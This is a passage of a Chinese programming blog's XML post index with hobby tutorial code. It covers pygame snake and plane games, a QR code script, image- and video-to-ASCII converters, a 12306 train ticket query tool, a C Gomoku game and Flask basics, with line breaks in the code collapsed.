favorite2, [XnY[0], XnY[1], rect_size, rect_size])def gameLoop(): gameExit = False gameOver = False change_load_x = 0 change_load_y = 0 snake_length = 1 center_x = screen_width/2 center_y = screen_height/2 load_x = center_x load_y = center_y Apple_x = (random.randrange(0, screen_width-rect_size)/10)*10 Apple_y = (random.randrange(0, screen_height-rect_size)/10)*10 while not gameExit: while gameOver: gameDisplay.fill(black) message_to_screen("Do you want to play again? press 'y' to continue, or 'q' to quit: ", favorite2, center_x-120, center_y-120) pygame.display.update() for event in pygame.event.get(): if event.type == pygame.KEYDOWN: if event.key == pygame.K_y: gameOver = False load_x = center_x load_y = center_y change_load_x = 0 change_load_y = 0 elif event.key == pygame.K_q: pygame.quit() quit() for event in pygame.event.get(): if event.type == pygame.QUIT: gameExit = True if event.type == pygame.KEYDOWN: if event.key == pygame.K_LEFT: change_load_x = -10 change_load_y = 0 if event.key == pygame.K_RIGHT: change_load_x = 10 change_load_y = 0 if event.key == pygame.K_UP: change_load_y = -10 change_load_x = 0 if event.key == pygame.K_DOWN: change_load_y = 10 change_load_x = 0 if load_x &lt; 0 or load_x &gt;= screen_width or load_y &lt; 0 or load_y &gt;= screen_height: gameOver = True load_x += change_load_x load_y += change_load_y gameDisplay.fill(favorite1) pygame.draw.rect(gameDisplay, red, [Apple_x, Apple_y, rect_size, rect_size]) snake_head = [] snake_head.append(load_x) snake_head.append(load_y) snake_list.append(snake_head) if len(snake_list) &gt; snake_length: del snake_list[0] snake(snake_list) if abs(load_x-Apple_x) &lt; 10 and abs(load_y-Apple_y) &lt; 10: Apple_x = (random.randrange(0, screen_width - rect_size) / 10) * 10 Apple_y = (random.randrange(0, screen_height - rect_size) / 10) * 10 snake_length += 1 pygame.display.update() clock.tick(FPS)gameLoop() 运行结果：]]></content>
      <categories>
        <category>python</category>
        <category>pygame</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>game</tag>
        <tag>pygame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pygame development plane game]]></title>
    <url>%2F2018%2F10%2F09%2FPygame-development-plane-game%2F</url>
    <content type="text"><![CDATA[Python真是太强大了，当我看到别人用pygame写出的Super Mario时……还有就是一个12岁的小孩竟然能写出“兔子和獾”这样的游戏来。在想想那时的自己，真的是羡慕，嫉妒，恨呀！ 兔子和獾Super Mario真的是太厉害了 game.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276# -*- coding: utf-8 -*-import pygamefrom sys import exitfrom pygame.locals import *import random# 设置游戏屏幕大小SCREEN_WIDTH = 480SCREEN_HEIGHT = 800# 子弹类class Bullet(pygame.sprite.Sprite): def __init__(self, bullet_img, init_pos): pygame.sprite.Sprite.__init__(self) self.image = bullet_img self.rect = self.image.get_rect() self.rect.midbottom = init_pos self.speed = 10 def move(self): self.rect.top -= self.speed# 玩家飞机类class Player(pygame.sprite.Sprite): def __init__(self, plane_img, player_rect, init_pos): pygame.sprite.Sprite.__init__(self) self.image = [] # 用来存储玩家飞机图片的列表 for i in range(len(player_rect)): self.image.append(plane_img.subsurface(player_rect[i]).convert_alpha()) self.rect = player_rect[0] # 初始化图片所在的矩形 self.rect.topleft = init_pos # 初始化矩形的左上角坐标 self.speed = 8 # 初始化玩家飞机速度，这里是一个确定的值 self.bullets = pygame.sprite.Group() # 玩家飞机所发射的子弹的集合 self.img_index = 0 # 玩家飞机图片索引 self.is_hit = False # 玩家是否被击中 # 发射子弹 def shoot(self, bullet_img): bullet = Bullet(bullet_img, self.rect.midtop) self.bullets.add(bullet) # 向上移动，需要判断边界 def moveUp(self): if self.rect.top &lt;= 0: self.rect.top = 0 else: self.rect.top -= self.speed # 向下移动，需要判断边界 def moveDown(self): if self.rect.top &gt;= SCREEN_HEIGHT - self.rect.height: self.rect.top = SCREEN_HEIGHT - self.rect.height else: self.rect.top += self.speed # 向左移动，需要判断边界 def moveLeft(self): if self.rect.left &lt;= 0: self.rect.left = 0 else: self.rect.left -= self.speed # 向右移动，需要判断边界 def moveRight(self): if self.rect.left &gt;= SCREEN_WIDTH - self.rect.width: self.rect.left = SCREEN_WIDTH - self.rect.width else: self.rect.left += self.speed# 敌机类class Enemy(pygame.sprite.Sprite): def __init__(self, enemy_img, enemy_down_imgs, init_pos): pygame.sprite.Sprite.__init__(self) self.image = enemy_img self.rect = self.image.get_rect() self.rect.topleft = init_pos self.down_imgs = enemy_down_imgs self.speed = 2 self.down_index = 0 # 敌机移动，边界判断及删除在游戏主循环里处理 def move(self): self.rect.top += self.speed# 初始化 pygamepygame.init()# 设置游戏界面大小、背景图片及标题# 游戏界面像素大小screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))# 游戏界面标题pygame.display.set_caption('飞机大战')# 背景图background = pygame.image.load('PythonShootGame/resources/image/background.png').convert()# Game Over 的背景图game_over = pygame.image.load('PythonShootGame/resources/image/gameover.png')# 飞机及子弹图片集合plane_img = pygame.image.load('PythonShootGame/resources/image/shoot.png')# 设置玩家飞机不同状态的图片列表，多张图片展示为动画效果player_rect = []player_rect.append(pygame.Rect(0, 99, 102, 126)) # 玩家飞机图片player_rect.append(pygame.Rect(165, 360, 102, 126))player_rect.append(pygame.Rect(165, 234, 102, 126)) # 玩家爆炸图片player_rect.append(pygame.Rect(330, 624, 102, 126))player_rect.append(pygame.Rect(330, 498, 102, 126))player_rect.append(pygame.Rect(432, 624, 102, 126))player_pos = [200, 600]player = Player(plane_img, player_rect, player_pos)# 子弹图片bullet_rect = pygame.Rect(1004, 987, 9, 21)bullet_img = plane_img.subsurface(bullet_rect)# 敌机不同状态的图片列表，多张图片展示为动画效果enemy1_rect = pygame.Rect(534, 612, 57, 43)enemy1_img = plane_img.subsurface(enemy1_rect)enemy1_down_imgs = []enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(267, 347, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(873, 697, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(267, 296, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(930, 697, 57, 43)))enemies1 = pygame.sprite.Group()# 存储被击毁的飞机，用来渲染击毁动画enemies_down = pygame.sprite.Group()# 初始化射击及敌机移动频率shoot_frequency = 0enemy_frequency = 0# 玩家飞机被击中后的效果处理player_down_index = 16# 初始化分数score = 0# 游戏循环帧率设置clock = pygame.time.Clock()# 判断游戏循环退出的参数running = True# 游戏主循环while running: # 控制游戏最大帧率为 60 clock.tick(60) # 生成子弹，需要控制发射频率 # 首先判断玩家飞机没有被击中 if not player.is_hit: if shoot_frequency % 15 == 0: player.shoot(bullet_img) shoot_frequency += 1 if shoot_frequency &gt;= 15: shoot_frequency = 0 # 生成敌机，需要控制生成频率 if enemy_frequency % 50 == 0: enemy1_pos = [random.randint(0, SCREEN_WIDTH - enemy1_rect.width), 0] enemy1 = Enemy(enemy1_img, enemy1_down_imgs, enemy1_pos) enemies1.add(enemy1) enemy_frequency += 1 if enemy_frequency &gt;= 100: enemy_frequency = 0 for bullet in player.bullets: # 以固定速度移动子弹 bullet.move() # 移动出屏幕后删除子弹 if bullet.rect.bottom &lt; 0: player.bullets.remove(bullet) for enemy in enemies1: #2. 移动敌机 enemy.move() #3. 敌机与玩家飞机碰撞效果处理 if pygame.sprite.collide_circle(enemy, player): enemies_down.add(enemy) enemies1.remove(enemy) player.is_hit = True break #4. 移动出屏幕后删除飞机 if enemy.rect.top &lt; 0: enemies1.remove(enemy) #敌机被子弹击中效果处理 # 将被击中的敌机对象添加到击毁敌机 Group 中，用来渲染击毁动画 enemies1_down = pygame.sprite.groupcollide(enemies1, player.bullets, 1, 1) for enemy_down in enemies1_down: enemies_down.add(enemy_down) # 绘制背景 screen.fill(0) screen.blit(background, (0, 0)) # 绘制玩家飞机 if not player.is_hit: screen.blit(player.image[player.img_index], player.rect) # 更换图片索引使飞机有动画效果 player.img_index = shoot_frequency // 8 else: # 玩家飞机被击中后的效果处理 player.img_index = player_down_index // 8 screen.blit(player.image[player.img_index], player.rect) player_down_index += 1 if player_down_index &gt; 47: # 击中效果处理完成后游戏结束 running = False # 敌机被子弹击中效果显示 for enemy_down in enemies_down: if enemy_down.down_index == 0: pass if enemy_down.down_index &gt; 7: enemies_down.remove(enemy_down) score += 1000 continue screen.blit(enemy_down.down_imgs[enemy_down.down_index // 2], enemy_down.rect) enemy_down.down_index += 1 # 显示子弹 player.bullets.draw(screen) # 显示敌机 enemies1.draw(screen) # 绘制得分 score_font = pygame.font.Font(None, 36) score_text = score_font.render(str(score), True, (128, 128, 128)) text_rect = score_text.get_rect() text_rect.topleft = [10, 10] screen.blit(score_text, text_rect) # 更新屏幕 pygame.display.update() # 处理游戏退出 for event in pygame.event.get(): if event.type == pygame.QUIT: pygame.quit() exit() # 获取键盘事件（上下左右按键） key_pressed = pygame.key.get_pressed() # 处理键盘事件（移动飞机的位置） if key_pressed[K_w] or key_pressed[K_UP]: player.moveUp() if key_pressed[K_s] or key_pressed[K_DOWN]: player.moveDown() if key_pressed[K_a] or key_pressed[K_LEFT]: player.moveLeft() if key_pressed[K_d] or key_pressed[K_RIGHT]: player.moveRight()# 游戏 Game Over 后显示最终得分font = pygame.font.Font(None, 48)text = font.render('Score: '+ str(score), True, (255, 0, 0))text_rect = text.get_rect()text_rect.centerx = screen.get_rect().centerxtext_rect.centery = screen.get_rect().centery + 24screen.blit(game_over, (0, 0))screen.blit(text, text_rect)# 显示得分并处理游戏退出while 1: for event in pygame.event.get(): if event.type == pygame.QUIT: pygame.quit() exit() pygame.display.update()]]></content>
      <categories>
        <category>python</category>
        <category>pygame</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pygame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python generates a personalized QR code]]></title>
    <url>%2F2018%2F10%2F09%2FPython-generates-a-personalized-QR-code%2F</url>
    <content type="text"><![CDATA[img.py123456789101112131415161718192021222324"""Usage: python3 img.py [image_name] [save_name]Options: -h --help show this on screen."""from MyQR import myqrimport argparseparser = argparse.ArgumentParser()parser.add_argument('image_name')parser.add_argument('save_name')args = parser.parse_args()img_name = args.file1save_name = args.file2myqr.run(words='https://www.shiyanlou.com', picture=img_name, save_name=save_name, colorized=True) 生成的图片：]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 3 implements image to color characters]]></title>
    <url>%2F2018%2F10%2F08%2FPython-3-implements-image-to-color-characters%2F</url>
    <content type="text"><![CDATA[colors.py123456789101112131415161718192021222324252627282930313233343536# 颜色映射def rgb(red, green, blue): return 16 + (red * 36) + (green * 6) + blue# 设置输出样式def set_style(fg=None, bg=None, bold=None): # 将参数设置为空 end='' 消除自动换行 print(_set_style(fg, bg, bold), end='')# 实现设置输出样式def _set_style(fg=None, bg=None, bold=''): result = '' if fg: result += '\x1b[38;5;%dm' % fg if bg: result += '\x1b[48;5;%dm' % bg if bold: result += '\x1b[1m' return result# 重置颜色def reset_color(): print(_reset_color(), end='')# 实现重置颜色def _reset_color(): return '\x1b[0m'# 打印字符def print_color(*args, **kwargs): fg = kwargs.pop('fg', None) bg = kwargs.pop('bg', None) bold = kwargs.pop('bold', None) set_style(fg, bg, bold) print(*args, **kwargs) reset_color() i2a.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125""" ### #### ###### ### ### # ### ### ### ###### ### #### ### ## ### #### ### ## ### ########## ##### ###i2a creates ASCII art from images right on your terminal.Usage: i2a [options] [FILE]Options: -h --help Show this on screen. -v --version Show version. -c --colors Show colored output. -b --bold Output bold characters --contrast=&lt;factor&gt; Manually set contrast [default: 1.5]. --alt-chars Use an alternate set of characters."""import subprocessfrom colors import *from PIL import Image, ImageEnhancefrom docopt import docopt__version__ = '1.0'_ASCII = "@80GCLft1i;:,. "_ASCII_2 = "Q0RMNWBDHK@$U8&amp;AOkYbZGPXgE4dVhgSqm6pF523yfwCJ#TnuLjz7oeat1[]!?I&#125;*&#123;srlcxvi)&gt;&lt;\\)|\"/+=^;,:'_-`. "# 图像转彩色字符函数def display_output(arguments): global _ASCII if arguments['--alt-chars']: _ASCII = _ASCII_2 try: im = Image.open(arguments['FILE']) except: raise IOError('Unable to open the file') im = im.convert("RGBA") try: _HEIGHT, _WIDTH = map(int, subprocess.check_output(['stty', 'size']).split()) except: _HEIGHT, _WIDTH = 50, 50 # 按比例缩放图像 aspect_ratio = im.size[0] / im.size[1] scaled_height = _WIDTH / aspect_ratio scaled_width = _HEIGHT * aspect_ratio * 2 # 计算调整之后的图像的宽高 width = scaled_width height = scaled_height if scaled_width &gt; _WIDTH: width = int(_WIDTH) height = int(scaled_height / 2) elif scaled_height &gt; _HEIGHT: width = int(scaled_width) height = int(_HEIGHT) # 将图像长宽转换为指定值 # resample 参数可选，指定了在变换图像大小过程中的采样方式，为了保证转变之后的图像质量，我们采用 PIL.Image.ANTIALIAS 选项指定高质量的采样滤波器。 im = im.resize((width,height), resample=Image.ANTIALIAS) # 创建 PIL.ImageEnhance.Contrast 对象，用于调整对比度 enhancer = ImageEnhance.Contrast(im) im = enhancer.enhance(float(arguments['--contrast'])) # 获取 im 的图像数据 # 返回值为 list 对象 img = im.getdata() # 将图像转换为灰阶图 im = im.convert('L') # 定义前景色与背景色 bg = rgb(0, 0, 0) fg = rgb(5, 5, 5) # 是否加粗显示字符 bold = None if arguments['--bold']: bold = True else: bold = False # 用于计数当前在第几列打印 row_len = 0 # 遍历每个像素点 for (count, i) in enumerate(im.getdata()): # 将像素值映射到相应的字符 ascii_char = _ASCII[int((i / 255.0) * (len(_ASCII) - 1))] # 若要求转成彩色字符 if arguments['--colors']: # 颜色映射 color = rgb(int((img[count][0] / 255.0) * 5), int((img[count][1] / 255.0) * 5),int((img[count][2] / 255.0) * 5)) # 背景色设置为该颜色 bg = color # 前景色置位黑色 fg = rgb(0, 0, 0) # 打印字符 print_color(' ', end='', fg=fg, bg=bg, bold=bold) row_len += 1 # 当列数等于终端宽的时候进行换行，并将 row_len 重新置 1 if row_len == width: row_len = 0 print('')def main(): # 获取命令行参数解析之后的字典 arguments = docopt(__doc__, version=__version__) # 若没有 FILE 参数，则打印帮助信息 # 若有则进行转换工作 if arguments['FILE']: display_output(arguments) else: print(__doc__)if __name__ == '__main__': main() 运行结果：]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python implementation of train ticket inquiry tool]]></title>
    <url>%2F2018%2F10%2F07%2FPython-implementation-of-train-ticket-inquiry-tool%2F</url>
    <content type="text"><![CDATA[Code:ticket.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# coding: utf-8"""命令行火车票查看器Usage: tickets [-gdtkz] &lt;from&gt; &lt;to&gt; &lt;date&gt;Options: -h,--help 显示帮助菜单 -g 高铁 -d 动车 -t 特快 -k 快速 -z 直达Example: tickets 北京 上海 2016-10-10 tickets -dg 成都 南京 2016-10-10"""from docopt import docoptimport requestsfrom stations import stationsfrom prettytable import PrettyTablefrom colorama import init, Foreinit()class TrainsCollection: header = '车次 车站 时间 历时 一等 二等 高级软卧 软卧 硬卧 硬座 无座'.split() def __init__(self, available_trains,available_place, options): """查询的火车班次集合 :param available_trains: 一个列表, 包含可获得的火车班次, 每个 火车班次是一个字典 :param options: 查询的选项, 如高铁, 动车, etc... """ self.available_trains = available_trains self.available_place = available_place self.options = options @property def trains(self): for raw_train in self.available_trains: raw_train_list = raw_train.split('|') train_no = raw_train_list[3] initial = train_no[0].lower() duration = raw_train_list[10] if not self.options or initial in self.options: train = [ train_no,# train number '\n'.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[6]] + Fore.RESET, Fore.LIGHTRED_EX + self.available_place[raw_train_list[7]] + Fore.RESET]), '\n'.join([Fore.LIGHTGREEN_EX + raw_train_list[8] + Fore.RESET, Fore.LIGHTRED_EX + raw_train_list[9] + Fore.RESET]), duration,#时长 raw_train_list[-6] if raw_train_list[-6] else '--',# 一等 raw_train_list[-7] if raw_train_list[-7] else '--',# 二等 raw_train_list[-15] if raw_train_list[-15] else '--',# 高级软卧 raw_train_list[-8] if raw_train_list[-8] else '--',# 软卧 raw_train_list[-14] if raw_train_list[-14] else '--',#硬卧 raw_train_list[-11] if raw_train_list[-11] else '--',#硬座 raw_train_list[-9] if raw_train_list[-9] else '--',#无座 ] yield train def pretty_print(self): pt = PrettyTable() pt._set_field_names(self.header) for train in self.trains: pt.add_row(train) print(pt)def cli(): """command-line interface""" arguments = docopt(__doc__) from_station = stations.get(arguments['&lt;from&gt;']) to_station = stations.get(arguments['&lt;to&gt;']) date = arguments['&lt;date&gt;'] url = ('https://kyfw.12306.cn/otn/leftTicket/queryA?' 'leftTicketDTO.train_date=&#123;&#125;&amp;' 'leftTicketDTO.from_station=&#123;&#125;&amp;leftTicketDTO.to_station=&#123;&#125;&amp;purpose_codes=ADULT').format( date, from_station, to_station ) r = requests.get(url, verify=True) # print(r.json()) available_trains = r.json()['data']['result'] available_place = r.json()['data']['map'] options = ''.join([ key for key, value in arguments.items() if value is True ]) TrainsCollection(available_trains, available_place, options).pretty_print()if __name__ == '__main__': cli() parse_station.py12345678import reimport requestsfrom pprint import pprinturl = 'https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9069'response = requests.get(url, verify=False)stations = re.findall(u'([\u4e00-\u9fa5]+)\|([A-Z]+)', response.text)pprint(dict(stations), indent=4) 运行结果： 解析数据这部分第一次接触感觉有点麻烦：12345678910111213141516171819202122232425262728293031@propertydef trains(self): for raw_train in self.available_trains: raw_train_list = raw_train.split('|') train_no = raw_train_list[3] initial = train_no[0].lower() duration = raw_train_list[10] if not self.options or initial in self.options: train = [ train_no,# train number '\n'.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[6]] + Fore.RESET, Fore.LIGHTRED_EX + self.available_place[raw_train_list[7]] + Fore.RESET]), '\n'.join([Fore.LIGHTGREEN_EX + raw_train_list[8] + Fore.RESET, Fore.LIGHTRED_EX + raw_train_list[9] + Fore.RESET]), duration,#时长 raw_train_list[-6] if raw_train_list[-6] else '--',# 一等 raw_train_list[-7] if raw_train_list[-7] else '--',# 二等 raw_train_list[-15] if raw_train_list[-15] else '--',# 高级软卧 raw_train_list[-8] if raw_train_list[-8] else '--',# 软卧 raw_train_list[-14] if raw_train_list[-14] else '--',#硬卧 raw_train_list[-11] if raw_train_list[-11] else '--',#硬座 raw_train_list[-9] if raw_train_list[-9] else '--',#无座 ] yield traindef pretty_print(self): pt = PrettyTable() pt._set_field_names(self.header) for train in self.trains: pt.add_row(train) print(pt)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 & OpenCV video character animation]]></title>
    <url>%2F2018%2F10%2F07%2FPython3-OpenCV-video-character-animation%2F</url>
    <content type="text"><![CDATA[code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177import sysimport osimport timeimport threadingimport termiosimport ttyimport cv2import pyprindclass CharFrame: ascii_char = "$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\"^`'. " # 像素映射到字符 def pixelToChar(self, luminance): return self.ascii_char[int(luminance/256*len(self.ascii_char))] # 将普通帧转为 ASCII 字符帧 def convert(self, img, limitSize=-1, fill=False, wrap=False): if limitSize != -1 and (img.shape[0] &gt; limitSize[1] or img.shape[1] &gt; limitSize[0]): img = cv2.resize(img, limitSize, interpolation=cv2.INTER_AREA) ascii_frame = '' blank = '' if fill: blank += ' '*(limitSize[0]-img.shape[1]) if wrap: blank += '\n' for i in range(img.shape[0]): for j in range(img.shape[1]): ascii_frame += self.pixelToChar(img[i,j]) ascii_frame += blank return ascii_frameclass I2Char(CharFrame): result = None def __init__(self, path, limitSize=-1, fill=False, wrap=False): self.genCharImage(path, limitSize, fill, wrap) def genCharImage(self, path, limitSize=-1, fill=False, wrap=False): img = cv2.imread(path, cv2.IMREAD_GRAYSCALE) if img is None: return self.result = self.convert(img, limitSize, fill, wrap) def show(self, stream = 2): if self.result is None: return if stream == 1 and os.isatty(sys.stdout.fileno()): self.streamOut = sys.stdout.write self.streamFlush = sys.stdout.flush elif stream == 2 and os.isatty(sys.stderr.fileno()): self.streamOut = sys.stderr.write self.streamFlush = sys.stderr.flush elif hasattr(stream, 'write'): self.streamOut = stream.write self.streamFlush = stream.flush self.streamOut(self.result) self.streamFlush() self.streamOut('\n')class V2Char(CharFrame): charVideo = [] timeInterval = 0.033 def __init__(self, path): if path.endswith('txt'): self.load(path) else: self.genCharVideo(path) def genCharVideo(self, filepath): self.charVideo = [] cap = cv2.VideoCapture(filepath) self.timeInterval = round(1/cap.get(5), 3) nf = int(cap.get(7)) print('Generate char video, please wait...') for i in pyprind.prog_bar(range(nf)): rawFrame = cv2.cvtColor(cap.read()[1], cv2.COLOR_BGR2GRAY) frame = self.convert(rawFrame, os.get_terminal_size(), fill=True) self.charVideo.append(frame) cap.release() def export(self, filepath): if not self.charVideo: return with open(filepath,'w') as f: for frame in self.charVideo: # 加一个换行符用以分隔每一帧 f.write(frame + '\n') def load(self, filepath): self.charVideo = [] # 一行即为一帧 for i in open(filepath): self.charVideo.append(i[:-1]) def play(self, stream = 1): # Bug: # 光标定位转义编码不兼容 Windows if not self.charVideo: return if stream == 1 and os.isatty(sys.stdout.fileno()): self.streamOut = sys.stdout.write self.streamFlush = sys.stdout.flush elif stream == 2 and os.isatty(sys.stderr.fileno()): self.streamOut = sys.stderr.write self.streamFlush = sys.stderr.flush elif hasattr(stream, 'write'): self.streamOut = stream.write self.streamFlush = stream.flush old_settings = None breakflag = None # 获得标准输入的文件描述符 fd = sys.stdin.fileno() def getChar(): nonlocal breakflag nonlocal old_settings # 保存标准输入的属性 old_settings = termios.tcgetattr(fd) # 设置标准输入为原始模式 tty.setraw(sys.stdin.fileno()) # 读取一个字符 ch = sys.stdin.read(1) breakflag = True if ch else False # 创建线程 getchar = threading.Thread(target=getChar) # 设置为守护线程 getchar.daemon = True # 启动守护线程 getchar.start() # 输出的字符画行数 rows = len(self.charVideo[0])//os.get_terminal_size()[0] for frame in self.charVideo: # 接收到输入则退出循环 if breakflag is True: break self.streamOut(frame) self.streamFlush() time.sleep(self.timeInterval) # 共 rows 行，光标上移 rows-1 行回到开始处 self.streamOut('\033[&#123;&#125;A\r'.format(rows-1)) # 恢复标准输入为原来的属性 termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) # 光标下移 rows-1 行到最后一行，清空最后一行 self.streamOut('\033[&#123;&#125;B\033[K'.format(rows-1)) # 清空最后一帧的所有行（从倒数第二行起） for i in range(rows-1): # 光标上移一行 self.streamOut('\033[1A') # 清空光标所在行 self.streamOut('\r\033[K') info = 'User interrupt!\n' if breakflag else 'Finished!\n' self.streamOut(info)if __name__ == '__main__': import argparse # 设置命令行参数 parser = argparse.ArgumentParser() parser.add_argument('file', help='Video file or charvideo file') parser.add_argument('-e', '--export', nargs = '?', const = 'charvideo.txt', help='Export charvideo file') # 获取参数 args = parser.parse_args() v2char = V2Char(args.file) if args.export: v2char.export(args.export) v2char.play()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C language quickly realizes Gomoku]]></title>
    <url>%2F2018%2F10%2F07%2FC-language-quickly-realizes-Gomoku%2F</url>
    <content type="text"><![CDATA[Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146//棋子 ● ○#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define N 15int chessboard[N + 1][N + 1] = &#123; 0 &#125;;//用来记录轮到玩家1还是玩家2int whoseTurn = 0;void initGame(void);void printChessboard(void);void playChess(void);int judge(int, int);int main(void)&#123; //初始化游戏 initGame(); while (1) &#123; //每次循环自增1，实现玩家轮流下子 whoseTurn++; playChess(); &#125; return 0;&#125;void initGame(void)&#123; char c; printf("input Y to enter the game:"); c = getchar(); if ('y' != c &amp;&amp; 'Y' != c) exit(0); system("clear"); printChessboard();&#125;void printChessboard(void)&#123; int i, j; for (i = 0; i &lt;= N; i++) &#123; for (j = 0; j &lt;= N; j++) &#123; if (0 == i) printf("%3d", j); else if (j == 0) printf("%3d", i); else if (1 == chessboard[i][j]) printf(" X"); else if (2 == chessboard[i][j]) printf(" O"); else printf(" *"); &#125; printf("\n"); &#125;&#125;void playChess(void)&#123; int i, j, winner; if (1 == whoseTurn % 2) &#123; printf("Turn to player 1, please input the position:"); scanf("%d %d", &amp;i, &amp;j); //如果输入的位置超出棋盘的范围，则重新输入。 if (i &gt; N+1 || j &gt; N+1) &#123; printf("your position beynod the chessboard range, please input the proper position:"); scanf("%d %d", &amp;i, &amp;j); &#125; while(chessboard[i][j] != 0) &#123; printf("your position is taken,choose another:"); scanf("%d %d", &amp;i, &amp;j); &#125; chessboard[i][j] = 1; &#125; else &#123; printf("Turn to player 2, please input the position:"); scanf("%d %d", &amp;i, &amp;j); //如果输入的位置超出棋盘的范围，则重新输入。 if (i &gt; N+1 || j &gt; N+1) &#123; printf("your position beynod the chessboard range, please input the proper position:"); scanf("%d %d", &amp;i, &amp;j); &#125; while(chessboard[i][j] != 0) &#123; printf("your position is taken,choose another:"); scanf("%d %d", &amp;i, &amp;j); &#125; chessboard[i][j] = 2; &#125; system("clear"); printChessboard(); if (judge(i, j)) &#123; if (1 == whoseTurn % 2) &#123; printf("player1 win!\n"); exit(0); &#125; else &#123; printf("player2 win!\n"); exit(0); &#125; &#125;&#125;int judge(int x, int y)&#123; int i, j; int t = 2 - whoseTurn % 2; const int step[4][2]=&#123;&#123;-1,0&#125;,&#123;0,-1&#125;,&#123;1,1&#125;,&#123;-1,1&#125;&#125;; // BUG for(int i=0;i&lt;4;++i) &#123; const int d[2]=&#123;-1,1&#125;; int count=1; for(int j=0;j&lt;2;++j) for(int k=1;k&lt;=4;++k)&#123; // suppose x = 5, y = 5 int row=x+k*d[j]*step[i][0]; // row: int col=y+k*d[j]*step[i][1]; // col: if(row&gt;=1&amp;&amp;row&lt;=N&amp;&amp;col&gt;=1&amp;&amp;col&lt;=N&amp;&amp;chessboard[x][y]==chessboard[row][col]) count+=1; else break; &#125; if(count&gt;=5) return 1; &#125; return 0;&#125; 运行结果：]]></content>
      <categories>
        <category>c</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>game</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 builds a personal blog based on the Flask framework]]></title>
    <url>%2F2018%2F10%2F06%2FPython3-builds-a-personal-blog-based-on-the-Flask-framework%2F</url>
    <content type="text"><![CDATA[完整代码]]></content>
      <categories>
        <category>python</category>
        <category>flask</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Flask web framework]]></title>
    <url>%2F2018%2F10%2F05%2FPython-Flask-web-framework%2F</url>
    <content type="text"><![CDATA[路由123456789@app.route('/user/&lt;username&gt;')def show_user_profile(username): # 显示用户的名称 return 'User %s' % username@app.route('/post/&lt;int:post_id&gt;')def show_post(post_id): # 显示提交整型的用户"id"的结果，注意"int"是将输入的字符串形式转换为整型数据 return 'Post %d' % post_id 静态文件及渲染模版hello.py123456from flask import render_template@app.route('/hello/')@app.route('/hello/&lt;name&gt;')def hello(name=None): return render_template('hello.html', name=name) hello.html1234567&lt;!doctype html&gt;&lt;title&gt;Hello from Flask&lt;/title&gt;&#123;% if name %&#125; &lt;h1&gt;Hello &#123;&#123; name &#125;&#125;!&lt;/h1&gt;&#123;% else %&#125; &lt;h1&gt;Hello World!&lt;/h1&gt;&#123;% endif %&#125; 重定向12345678910from flask import abort, redirect, url_for@app.route('/')def index(): return redirect(url_for('login'))@app.route('/login')def login(): abort(401) this_is_never_executed() 定制错误页面：12345from flask import render_template@app.errorhandler(404)def page_not_found(error): return render_template('page_not_found.html'), 404 回话：123456789101112131415161718192021222324252627282930from flask import Flask, session, redirect, url_for, escape, requestapp = Flask(__name__)@app.route('/')def index(): if 'username' in session: return 'Logged in as %s' % escape(session['username']) return 'You are not logged in'@app.route('/login', methods=['GET', 'POST'])def login(): if request.method == 'POST': session['username'] = request.form['username'] return redirect(url_for('index')) return ''' &lt;form action="" method="post"&gt; &lt;p&gt;&lt;input type=text name=username&gt; &lt;p&gt;&lt;input type=submit value=Login&gt; &lt;/form&gt; '''@app.route('/logout')def logout(): # 如果用户名存在，则从会话中移除该用户名 session.pop('username', None) return redirect(url_for('index'))# 设置密钥，保证会话安全app.secret_key = 'wing1995 is a 